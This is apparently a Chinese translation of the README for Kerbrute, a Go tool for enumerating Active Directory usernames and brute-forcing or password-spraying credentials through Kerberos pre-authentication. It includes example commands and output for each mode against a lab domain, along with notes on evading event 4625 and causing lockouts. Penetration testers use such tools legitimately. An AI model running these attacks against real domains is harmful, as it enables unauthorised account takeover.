# 克布鲁特

[![循环CI](https://camo.githubusercontent.com/a0d8cf14dacab007f5ded2c671d2a11ee1824c4038c177dd8e99d08a5745097e/68747470733a2f2f636972636c6563692e636f6d2f67682f726f706e6f702f6b657262727574652e7376673f7374796c653d737667)](https://circleci.com/gh/ropnop/kerbrute)

一种通过 Kerberos 预身份验证快速暴力破解并枚举有效 Active Directory 帐户的工具

[从发布页面](https://github.com/ropnop/kerbrute/releases/latest)获取最新的二进制文件以开始使用。

## 背景

这个工具源自我几年前编写的一些[bash 脚本，用于使用 Linux 上的 Heimdal Kerberos 客户端执行暴力破解。](https://github.com/ropnop/kerberos_windows_scripts)我想要一些不需要特权来安装 Kerberos 客户端的东西，当我发现 Kerberos [gokrb5](https://github.com/jcmturner/gokrb5)令人惊叹的纯 Go 实现时，我决定最终学习 Go 并编写这个。

使用 Kerberos 暴力破解 Windows 密码比我所知道的任何其他方法都要快得多，并且可能更隐蔽，因为预身份验证失败不会触发“传统”`An account failed to log on`事件 4625。使用 Kerberos，您只需发送一个即可验证用户名或测试登录发送至 KDC（域控制器）的 UDP 帧

有关更多背景和信息，请查看我的 Troopers 2019 演讲：Fun with LDAP and Kerberos（链接待定）

## 用法

Kerbrute 有三个主要命令：

- **bruteuser** - 从单词列表中暴力破解单个用户的密码
- **bruteforce** - 从文件或标准输入中读取用户名：密码组合并测试它们
- **passwordspray** - 针对用户列表测试单个密码
- **userenum** - 通过 Kerberos 枚举有效的域用户名

必须指定域 ( `-d`) 或域控制器 ( )。`--dc`如果未提供域控制器，则将通过 DNS 查找 KDC。

默认情况下，Kerbrute 是多线程的，使用 10 个线程。这可以通过选项更改`-t`。

输出记录到 stdout，但可以使用 指定日志文件`-o`。

默认情况下，不记录失败，但可以使用 进行更改`-v`。

最后，Kerbrute 有一个`--safe`选择。启用此选项后，如果帐户返回锁定状态，它将中止所有线程以停止锁定任何其他帐户。

该`help`命令可用于获取更多信息

```
$ ./kerbrute -h

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (bc1d606) - 11/15/20 - Ronnie Flathers @ropnop

This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.
Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts

Usage:
  kerbrute [command]

Available Commands:
  bruteforce    Bruteforce username:password combos, from a file or stdin
  bruteuser     Bruteforce a single user's password from a wordlist
  help          Help about any command
  passwordspray Test a single password against a list of users
  userenum      Enumerate valid domain usernames via Kerberos
  version       Display version info and quit

Flags:
      --dc string          The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
      --delay int          Delay in millisecond between each attempt. Will always use single thread if set
  -d, --domain string      The full domain to use (e.g. contoso.com)
      --downgrade          Force downgraded encryption type (arcfour-hmac-md5)
      --hash-file string   File to save AS-REP hashes to (if any captured), otherwise just logged
  -h, --help               help for kerbrute
  -o, --output string      File to write logs to. Optional.
      --safe               Safe mode. Will abort if any user comes back as locked out. Default: FALSE
  -t, --threads int        Threads to use (default 10)
  -v, --verbose            Log failures and errors

Use "kerbrute [command] --help" for more information about a command.
```



### 用户枚举

为了枚举用户名，Kerbrute 会发送不带预身份验证的 TGT 请求。如果 KDC 响应错误`PRINCIPAL UNKNOWN`，则表明该用户名不存在。但是，如果 KDC 提示进行预身份验证，我们就知道该用户名存在，然后继续。这不会导致任何登录失败，因此不会锁定任何帐户。如果启用了 Kerberos 日志记录，这会生成 Windows 事件 ID [4768 。](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768)

```
root@kali:~# ./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (43f9ca1) - 03/06/19 - Ronnie Flathers @ropnop

2019/03/06 21:28:04 >  Using KDC(s):
2019/03/06 21:28:04 >   pdc01.lab.ropnop.com:88

2019/03/06 21:28:04 >  [+] VALID USERNAME:       amata@lab.ropnop.com
2019/03/06 21:28:04 >  [+] VALID USERNAME:       thoffman@lab.ropnop.com
2019/03/06 21:28:04 >  Done! Tested 1001 usernames (2 valid) in 0.425 seconds
```



### 密码喷洒

使用`passwordspray`，Kerbrute 将对域用户列表执行水平暴力攻击。当您拥有大量用户时，这对于测试一两个常用密码非常有用。警告：这确实会增加失败登录计数并锁定帐户。这将生成两个事件 ID [4768 - 请求了 Kerberos 身份验证票证 (TGT)](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768)和[4771 - Kerberos 预身份验证失败](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4771)

```
root@kali:~# ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (43f9ca1) - 03/06/19 - Ronnie Flathers @ropnop

2019/03/06 21:37:29 >  Using KDC(s):
2019/03/06 21:37:29 >   pdc01.lab.ropnop.com:88

2019/03/06 21:37:35 >  [+] VALID LOGIN:  callen@lab.ropnop.com:Password123
2019/03/06 21:37:37 >  [+] VALID LOGIN:  eshort@lab.ropnop.com:Password123
2019/03/06 21:37:37 >  Done! Tested 2755 logins (2 successes) in 7.674 seconds
```



### 野蛮用户

这是针对用户名的传统暴力破解帐户。仅当您确定没有锁定策略时才运行此命令！这将生成两个事件 ID [4768 - 请求了 Kerberos 身份验证票证 (TGT)](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768)和[4771 - Kerberos 预身份验证失败](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4771)

```
root@kali:~# ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (43f9ca1) - 03/06/19 - Ronnie Flathers @ropnop

2019/03/06 21:38:24 >  Using KDC(s):
2019/03/06 21:38:24 >   pdc01.lab.ropnop.com:88

2019/03/06 21:38:27 >  [+] VALID LOGIN:  thoffman@lab.ropnop.com:Summer2017
2019/03/06 21:38:27 >  Done! Tested 1001 logins (1 successes) in 2.711 seconds
```



### 暴力破解

`username:password`此模式只是从文件或中读取用户名和密码组合（格式为） `stdin`，并使用 Kerberos PreAuthentication 对其进行测试。它将跳过任何空白行或具有空白用户名/密码的行。这将生成两个事件 ID [4768 - 请求了 Kerberos 身份验证票证 (TGT)](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768)和[4771 - Kerberos 预身份验证失败](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4771)

```
$ cat combos.lst | ./kerbrute -d lab.ropnop.com bruteforce -

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 05/11/19 - Ronnie Flathers @ropnop

2019/05/11 18:40:56 >  Using KDC(s):
2019/05/11 18:40:56 >   pdc01.lab.ropnop.com:88

2019/05/11 18:40:56 >  [+] VALID LOGIN:  athomas@lab.ropnop.com:Password1234
2019/05/11 18:40:56 >  Done! Tested 7 logins (1 successes) in 0.114 seconds
```



## 安装中

[您可以从发布页面](https://github.com/ropnop/kerbrute/releases/tag/latest)下载适用于 Linux、Windows 和 Mac 的预编译二进制文件。如果你想生活在边缘，你也可以用 Go 安装：

```
$ go get github.com/ropnop/kerbrute
```



克隆存储库后，您还可以使用 Make 文件来编译常见架构：

```
$ make help
help:            Show this help.
windows:  Make Windows x86 and x64 Binaries
linux:  Make Linux x86 and x64 Binaries
mac:  Make Darwin (Mac) x86 and x64 Binaries
clean:  Delete any binaries
all:  Make Windows, Linux and Mac x86/x64 Binaries

$ make all
Done.
Building for windows amd64..
Building for windows 386..
Done.
Building for linux amd64...
Building for linux 386...
Done.
Building for mac amd64...
Building for mac 386...
Done.

$ ls dist/
kerbrute_darwin_386        kerbrute_linux_386         kerbrute_windows_386.exe
kerbrute_darwin_amd64      kerbrute_linux_amd64       kerbrute_windows_amd64.exe
```



## 制作人员

强烈感谢 jcmturner 对 KRB5 的纯 Go 实现： https: [//github.com/jcmturner/gokrb5](https://github.com/jcmturner/gokrb5)。一个了不起的项目并且有很好的记录。如果没有那个项目，这一切都无法完成。

感谢[audibleblink](https://github.com/audibleblink)的建议和该`delay`选项的实施！